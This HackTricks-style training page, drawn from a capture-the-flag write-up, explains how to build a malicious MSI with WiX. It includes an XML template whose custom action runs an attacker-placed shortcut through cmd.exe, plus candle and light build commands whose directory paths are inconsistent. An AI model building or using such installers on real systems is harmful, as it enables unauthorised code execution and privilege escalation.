{{#include ../../banners/hacktricks-training.md}}

# Creating Malicious MSI and Getting Root

The creation of the MSI installer will be done using wixtools, specifically [wixtools](http://wixtoolset.org) will be utilized. It is worth mentioning that alternative MSI builders were attempted, but they were not successful in this particular case.

For a comprehensive understanding of wix MSI usage examples, it is advisable to consult [this page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Here, you can find various examples that demonstrate the usage of wix MSI.

The aim is to generate an MSI that will execute the lnk file. In order to achieve this, the following XML code could be employed ([xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):

```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```

It is important to note that the Package element contains attributes such as InstallerVersion and Compressed, specifying the version of the installer and indicating whether the package is compressed or not, respectively.

The creation process involves utilizing candle.exe, a tool from wixtools, to generate a wixobject from msi.xml. The following command should be executed:

```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```

Additionally, it is worth mentioning that an image is provided in the post, which depicts the command and its output. You can refer to it for visual guidance.

Furthermore, light.exe, another tool from wixtools, will be employed to create the MSI file from the wixobject. The command to be executed is as follows:

```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```

Similar to the previous command, an image is included in the post illustrating the command and its output.

Please note that while this summary aims to provide valuable information, it is recommended to refer to the original post for more comprehensive details and accurate instructions.

## References

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
  [wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}



